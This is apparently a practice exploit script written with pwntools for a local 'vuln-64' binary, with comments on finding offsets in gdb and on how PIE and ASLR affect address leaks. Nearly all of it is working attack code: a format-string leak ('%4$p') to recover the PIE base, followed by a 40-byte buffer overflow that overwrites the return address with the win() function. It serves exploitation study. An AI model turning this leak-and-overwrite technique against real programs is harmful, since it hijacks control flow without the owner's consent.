# 1. Turn off ASLR first
# 2. run binary with gdb and set breakpoint to main to load the binary
# 3. run the program, and use 'piebase' command to get the pie base
# 4. take the leaked binary pointer from format specififer 4'th element and calculate in gdb
# 5. 'x [leak] - [piebase]'
# 6. offset retrieved


# Extra ~~ Constant address (offset) in binary is different from runtime address if PIE is enabled

# IMPORTANT : 32-bit no matter how many times run %p the address still the same. Meanwhile, 64-bit need to have exact number of %p and cannot exceed itself
#			  otherwise cannot get base address.

# IMPORTANT : if PIE is enabled, ASLR doesnt really play a role in the binary. In this case, it returns to a function that is 
#			  available which is win(), it doesnt rely on libc. But when there is no win() function and you want to pop a shell,
#			  we need to leak the base address regardless if ASLR is turned off or on (If PIE is enabled)




# 64-bit example: %p %p %p %p 
#				  0x7fffffffdb40 (nil) (nil) 0x5555555596bc

#				  %p %p %p %p %p %p 
#				  0x7fffffffdb40 (nil) (nil) 0x5555555596c5 (nil) 0x7025207025207025

#				  %4$p
#				  0x5555555596b5

# Notice the pointer keeps changing everytime even the 4 of %p, in conclusion for 64-bit use the '%[n'th]$p' to grab leak address




from pwn import *

# Set arch context
elf = context.binary = ELF('./vuln-64')
io = process()

# Send format specfier
io.recvuntil('name?\n')
io.sendline('%4$p')

# Receive leak address
io.recvuntil('you ')
elf.leak = int(io.recvline(), 16)

# Grab offset
offset = 0x56b5 

# Calculate base address at runtime
elf.address = elf.leak - offset

log.success(f'PIE base: {hex(elf.address)}')

# Send payload
payload = b'A' * 40
payload += p64(elf.sym['win'])

io.recvuntil('message?\n')
io.sendline(payload)


print(io.clean().decode())